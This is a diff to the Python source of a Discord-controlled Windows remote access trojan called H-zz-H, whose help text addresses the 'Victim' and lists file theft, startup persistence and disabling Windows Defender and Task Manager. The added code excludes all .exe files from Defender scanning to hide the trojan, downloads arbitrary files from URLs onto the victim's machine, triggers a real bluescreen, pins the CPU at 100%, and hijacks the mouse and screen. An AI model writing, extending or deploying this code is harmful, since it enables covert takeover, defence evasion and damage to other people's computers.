@@ -29,15 +29,14 @@ import sounddevice as sd
 import win32crypt
 import shutil
 from pynput import keyboard
-from urllib3 import PoolManager, HTTPResponse
+from urllib3 import PoolManager
+from urllib.parse import urlparse
 from ctypes import *
 from concurrent.futures import ThreadPoolExecutor
 from colorama import Fore, init
 from discord.ext import commands
 from PIL import Image, ImageTk, ImageGrab
 from datetime import datetime, timedelta
-
-from Crypto.Cipher import AES
 
 os.system("@echo off")
 os.system("cls")
@@ -180,6 +179,10 @@ LOCALAPPDATA = os.getenv("localappdata")
 REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
 REGEX_ENC = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
 current_directory = os.getcwd()
+MIXER_OBJECTF_HMIXER = 0
+MIXER_CONTROL_CONTROLTYPE_VOLUME = 0x50000
+MIXERCONTROL_CONTROLTYPE_VOLUME = 0x50000
+MIXER_GETLINEINFOF_SOURCE = 0x00000001
 
 def get_system_info():
     try:
@@ -876,6 +879,48 @@ def block_inputs():
 def unblock_inputs():
     ctypes.windll.user32.BlockInput(False)
 
+def reverse_mouse_move():
+    global reverse_mouse
+    prev_x, prev_y = pyautogui.position()
+    
+    while reverse_mouse:
+        curr_x, curr_y = pyautogui.position()
+        
+        dx = curr_x - prev_x
+        dy = curr_y - prev_y
+        
+        pyautogui.moveTo(prev_x - dx, prev_y - dy)
+        
+        prev_x, prev_y = pyautogui.position()
+        
+        time.sleep(0.01)
+
+def jumpscaaare():
+    try:
+        subprocess.Popen(["start", "msedge", "https://only-fans.uk/hzzh_rat"], shell=True)
+
+        time.sleep(2)
+
+        pyautogui.press('f11')
+
+    except Exception as e:
+        print(f"Error in opening website: {e}")
+
+cpu_stress_running = False
+def cpu_stress():
+    while cpu_stress_running:
+        pass
+
+reverse_mouse = False
+
+def reverse_mouse_move():
+    while reverse_mouse:
+        x, y = pyautogui.position()
+
+        pyautogui.moveTo(-x, -y)
+
+        pyautogui.sleep(0.1)
+
 @bot.command()
 async def help(ctx):
     embed = discord.Embed(
@@ -916,7 +961,8 @@ async def help(ctx):
     )
     embed1.add_field(name="!download (file/path)", value="Download a file from Victims PC (10MB)📥", inline=False)
     embed1.add_field(name="!download_ext (file.png)", value="Download a file from Victims PC (100MB)📥", inline=False)
-    embed1.add_field(name="!upload (attachment) (!path!)", value="Upload a file to Victims PC 📤", inline=False)
+    embed1.add_field(name="!upload (attachment) (!path!)", value="Upload a file to Victims PC (10MB)📤", inline=False)
+    embed1.add_field(name="!upload_ext (URL) (!path!)", value="Upload a file to Victims PC (Unlimited MB)📤", inline=False)
     embed1.add_field(name="!startup", value="Puts H-zz-H in Startups using 5 different unknown Methods 🐀", inline=False)
     embed1.add_field(name="!admin", value="Checks for admin Permissions 🛠️", inline=False)
     embed1.add_field(name="!wallpaper (attachment.png)", value="Change wallpaper of Victim 🖼️", inline=False)
@@ -938,13 +984,13 @@ async def help(ctx):
     embed1.add_field(name="!taskmgr", value="Disables Task Manager 🎰", inline=False)
     embed1.add_field(name="!taskmgr_enable", value="Enables Task Manager 🎰", inline=False)
     embed1.add_field(name="!blocklist", value="Disables the Victim to lookup common AV Sites 🦠", inline=False)
-    embed1.add_field(name="!unblocklist", value="Enables the Victim to lookup common AV Sites 🦠", inline=False)
 
     await ctx.send(embed=embed1)
 
     embed2 = discord.Embed(
         color=0x00ff00 
     )
+    embed2.add_field(name="!unblocklist", value="Enables the Victim to lookup common AV Sites 🦠", inline=False)
     embed2.add_field(name="!nostartup", value="Disable Users permissions to look in the Startup Folder 🔒🗂️", inline=False)
     embed2.add_field(name="!nostartup_disable", value="Enables Users permissions to look in the Startup Folder 🔓🗂️", inline=False)
     embed2.add_field(name="!critproc", value="Makes H-zz-H a critical process. Close = Bluescreen 🆙", inline=False)
@@ -952,10 +998,17 @@ async def help(ctx):
     embed2.add_field(name="!smartup", value="Uses an Unknown StartUp path. 🐀", inline=False)
     embed2.add_field(name="!windef", value="Disables Windows Defender. 🛡", inline=False)
     embed2.add_field(name="!block", value="Blocks/Unblocks the inputs. 🖱️❌⌨️", inline=False)
+    embed2.add_field(name="!exclude_exe", value="Hide RAT by excluding all .exe files in Windows Defender. 🐀", inline=False)
     embed2.add_field(name="", value="", inline=False)
     embed2.add_field(name="", value="**Troll Features:**", inline=False)
     embed2.add_field(name="!floatpic (seconds) (url)", value="Creates an floating unclosable image for (seconds)", inline=False)
     embed2.add_field(name="!screensaver", value="Shows an auto installed screensaver", inline=False)
+    embed2.add_field(name="!logout", value="Logs out of current user (like win+L)", inline=False)
+    embed2.add_field(name="!reverse", value="Reverses the mouse movement! 🖱️🔄", inline=False)
+    embed2.add_field(name="!jumpscare", value="loud, scary jumpscare😱🔊", inline=False)
+    embed2.add_field(name="!cpufuck", value="Maxes out the CPU usage to 100% ⚡💻", inline=False)
+    embed2.add_field(name="!bluescreen", value="Crashes the PC with a BSOD. 💥🖥️", inline=False)
+    embed2.add_field(name="!shaking", value="Makes the mouse shake automaticly 🖱️💥", inline=False)
     embed2.add_field(name="", value="", inline=False)
     embed2.add_field(name="", value="**Discord Features:**", inline=False)
     embed2.add_field(name="!purge (amount)", value="Purges (amount) Chat Messages in Chat 🚮", inline=False)
@@ -964,6 +1017,223 @@ async def help(ctx):
     embed2.add_field(name="", value="Made with ❤ by H-zz-H.", inline=False)
 
     await ctx.send(embed=embed2)
+
+@bot.command()
+async def exclude_exe(ctx):
+    if is_admin():
+        try:
+            ps_command = "Add-MpPreference -ExclusionExtension '.exe'"
+            subprocess.run(["powershell", "-Command", ps_command], check=True)
+
+            embed = discord.Embed(
+                title="✅ .exe Exclusion Added",
+                description="Successfully added the .exe exclusion to Windows Defender.",
+                color=discord.Color.green()
+            )
+        except Exception as e:
+            embed = discord.Embed(
+                title="❌ Failed to Add Exclusion",
+                description=f"Error occurred: `{e}`",
+                color=discord.Color.red()
+            )
+    else:
+        embed = discord.Embed(
+            title="❌ Admin Privileges Required!",
+            description="This script isn't running with Admin! Use `!getadmin` to get Admin!",
+            color=discord.Color.red()
+        )
+
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def upload_ext(ctx, path: str = None):
+    try:
+        if not path or urlparse(path).scheme not in ['http', 'https']:
+            embed = discord.Embed(
+                title="⚠️ Invalid or Missing URL",
+                description="Please provide a valid file URL. Example:\n`!upload https://example.com/file.exe`",
+                color=0xFFAA00
+            )
+            await ctx.send(embed=embed)
+            return
+
+        filename = os.path.basename(urlparse(path).path)
+        file_path = os.path.join(temp_folder, filename)
+
+        response = requests.get(path)
+        if response.status_code != 200:
+            raise Exception(f"Failed to download file. HTTP status: {response.status_code}")
+        
+        with open(file_path, 'wb') as f:
+            f.write(response.content)
+
+        embed = discord.Embed(
+            title="✅ File Downloaded",
+            description=f"File `{filename}` has been downloaded to `{file_path}`.",
+            color=0x00FF00
+        )
+        await ctx.send(embed=embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ Error",
+            description=f"An error occurred: `{str(e)}`",
+            color=0xFF0000
+        )
+        await ctx.send(embed=embed)
+
+shaking_enabled = False
+shaking_task = None
+@bot.command()
+async def shaking(ctx):
+    global shaking_enabled, shaking_task
+
+    if not shaking_enabled:
+        shaking_enabled = True
+
+        async def shake_mouse():
+            while shaking_enabled:
+                x, y = pyautogui.position()
+                pyautogui.moveTo(x + 10, y + 10, duration=0.05)
+                pyautogui.moveTo(x - 10, y - 10, duration=0.05)
+                await asyncio.sleep(0.05)
+
+        shaking_task = asyncio.create_task(shake_mouse())
+
+        embed = discord.Embed(
+            title="🖱️ Mouse Shaking Activated",
+            description="The mouse is now shaking randomly.",
+            color=0x00ff00
+        )
+    else:
+        shaking_enabled = False
+        if shaking_task:
+            shaking_task.cancel()
+            shaking_task = None
+
+        embed = discord.Embed(
+            title="🛑 Mouse Shaking Stopped",
+            description="Mouse movement has returned to normal.",
+            color=0xff0000
+        )
+
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def bluescreen(ctx):
+    try:
+        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
+        
+        embed = discord.Embed(
+            title="💥 BSOD Triggered",
+            description="A real BSOD has been triggered.",
+            color=0xff0000
+        )
+        await ctx.send(embed=embed)
+        
+    except Exception as e:
+        embed = discord.Embed(
+            title="⚠️ Error",
+            description=f"Failed to trigger BSOD. Error: {e}",
+            color=0xff0000
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def cpufuck(ctx):
+    global cpu_stress_running
+    
+    if cpu_stress_running:
+        cpu_stress_running = False
+        embed = discord.Embed(
+            title="🔴 CPU Fucker Stopped",
+            description="Stopped.",
+            color=0x00ff00
+        )
+        await ctx.send(embed=embed)
+    else:
+        cpu_stress_running = True
+        threading.Thread(target=cpu_stress).start()
+        
+        embed = discord.Embed(
+            title="⚡ CPU Fucker Started",
+            description="Going to 100%!",
+            color=0xff0000
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def jumpscare(ctx):
+    try:
+        embed = discord.Embed(
+            title="⚠️ Jumpscare Warning!",
+            description="A fullscreen jumpscare is about to appear! 😱🔊",
+            color=0xff0000
+        )
+        await ctx.send(embed=embed)
+
+        jumpscaaare()
+
+        embed = discord.Embed(
+            title="💥 Jumpscare Triggered!",
+            description="The jumpscare website has been opened in fullscreen! LOUD SOUND ALERT! 😱",
+            color=0xff0000
+        )
+        await ctx.send(embed=embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="⚠️ Error",
+            description=f"An error occurred while triggering the jumpscare: {e}",
+            color=0xff0000
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def reverse(ctx):
+    global reverse_mouse
+    
+    if reverse_mouse:
+        reverse_mouse = False
+        embed = discord.Embed(
+            title="🖱️ Mouse Movement Reversed",
+            description="Mouse movement reversal has been stopped! 🔄",
+            color=0x00ff00
+        )
+        await ctx.send(embed=embed)
+    else:
+        reverse_mouse = True
+        threading.Thread(target=reverse_mouse_move, daemon=True).start()
+        
+        embed = discord.Embed(
+            title="🖱️ Mouse Movement Reversed",
+            description="Mouse movement will now be reversed! 🔄",
+            color=0x00ff00
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def logout(ctx):
+    try:
+        ctypes.windll.user32.LockWorkStation()
+
+        embed = discord.Embed(
+            title="🔒 Logging Out",
+            description="You have been logged out successfully (like pressing Win+L).",
+            color=0x00ff00
+        )
+        
+        await ctx.send(embed=embed)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="⚠️ Error",
+            description=f"Failed to log out. Error: {e}",
+            color=0xff0000
+        )
+        
+        await ctx.send(embed=embed)
 
 input_blocked = False
 @bot.command()
